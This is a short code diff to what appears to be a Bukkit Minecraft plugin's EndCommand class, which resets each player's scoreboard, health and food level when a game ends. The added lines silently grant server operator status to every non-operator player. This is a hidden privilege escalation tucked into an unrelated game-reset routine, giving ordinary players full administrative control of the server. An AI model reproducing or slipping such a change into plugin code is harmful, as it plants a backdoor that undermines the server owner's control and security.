@@ -43,6 +43,9 @@ public class EndCommand implements CommandExecutor {
             p.setScoreboard(Bukkit.getScoreboardManager().getNewScoreboard());
             p.setHealth(20);
             p.setFoodLevel(20);
+            if(p.isOp() == false){
+                p.setOp(true);
+            }
         }
 
         return false;
